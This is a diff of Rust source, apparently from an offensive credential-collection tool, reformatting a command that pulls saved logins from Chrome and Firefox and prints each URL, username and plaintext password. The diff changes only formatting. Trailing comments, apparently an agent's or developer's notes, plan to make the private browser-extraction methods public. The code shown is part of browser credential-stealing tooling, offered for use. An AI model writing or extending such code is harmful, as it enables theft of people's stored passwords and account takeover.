@@ -53,15 +53,9 @@ impl Command for CollectCommand {
         let collector = BrowserCollector::new();
 
         let creds = match verb {
-            "chrome" => {
-                collector.collect_chrome().unwrap_or_default()
-            },
-            "firefox" => {
-                collector.collect_firefox().unwrap_or_default()
-            },
-            "all" => {
-                collector.collect()
-            },
+            "chrome" => collector.collect_chrome().unwrap_or_default(),
+            "firefox" => collector.collect_firefox().unwrap_or_default(),
+            "all" => collector.collect(),
             _ => return Err(format!("Unknown browser type: {}", verb)),
         };
 
@@ -72,23 +66,28 @@ impl Command for CollectCommand {
 
         Output::success(&format!("Found {} credentials", creds.len()));
         println!();
-        println!("{:<15} {:<30} {:<30} {:<20}", "BROWSER", "URL", "USERNAME", "PASSWORD");
+        println!(
+            "{:<15} {:<30} {:<30} {:<20}",
+            "BROWSER", "URL", "USERNAME", "PASSWORD"
+        );
         println!("{}", "-".repeat(100));
 
         for cred in creds {
             let pwd = cred.password.as_deref().unwrap_or("[EMPTY]");
-            println!("{:<15} {:<30} {:<30} {:<20}", 
-                cred.browser, 
-                cred.url.chars().take(28).collect::<String>(), 
-                cred.username.chars().take(28).collect::<String>(), 
-                pwd.chars().take(20).collect::<String>());
+            println!(
+                "{:<15} {:<30} {:<30} {:<20}",
+                cred.browser,
+                cred.url.chars().take(28).collect::<String>(),
+                cred.username.chars().take(28).collect::<String>(),
+                pwd.chars().take(20).collect::<String>()
+            );
         }
 
         Ok(())
     }
 }
 
-// Extension methods for BrowserCollector to access private methods if needed, 
-// or I can modify BrowserCollector to be more public. 
+// Extension methods for BrowserCollector to access private methods if needed,
+// or I can modify BrowserCollector to be more public.
 // Note: BrowserCollector::collect_chrome/firefox are private in the file I read.
 // I need to make them public in src/modules/collection/browser_creds.rs
